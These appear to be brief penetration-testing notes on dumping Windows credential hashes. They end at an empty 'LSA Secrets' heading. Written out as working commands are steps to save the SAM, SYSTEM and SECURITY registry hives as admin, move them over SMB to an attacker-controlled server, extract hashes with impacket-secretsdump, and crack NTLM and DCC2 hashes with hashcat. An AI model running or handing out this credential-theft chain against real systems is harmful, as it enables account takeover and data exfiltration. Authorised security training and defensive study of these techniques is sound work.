In Windows, we have different ways to extract user credentials in hash form.

Registry Hives - SAM, SYSTEM and SECURITY

-Extracting 3 hives via reg.exe
```
#Require ps/cmd in admin privilege
reg.exe save hklm\sam <abspath_desired>
reg.exe save hklm\system <abspath_desired>
reg.exe save hklm\security <abspath_desired>
```
Only sam and system is a must as with this combination, we have access to local user hashes, yet if its domain user we are after, security is also required.

We can move the files to our server with any means we like, yet if only command line is available, moving via smb is recommended.
```
move <hivefile> \\<ip>\<share>
```

After that, we can use impacket-secretsdump to extract the hashes
```
impacket-secretsdump -sam <samfile> -security <securityfile> -system <systemfile> -outputfile <fname> LOCAL
```

After that, for NTLM hash isolate the 4th column, then you can use hashcat with mode 1000 to crack all at once
```
awk -F: '{print $4}' <inputfile> | grep -v '^$' > <outputfile>
```

For domain hashes, we can extract DCC2 hashes, for DCC2 hashes we can crack with hashcat in mode 2100, no extra processing is needed and we can directly supply whole hash, notice that cracking DCC2 hashes is significantly more difficult then NTLM and results in increased time

LSA Secrets:

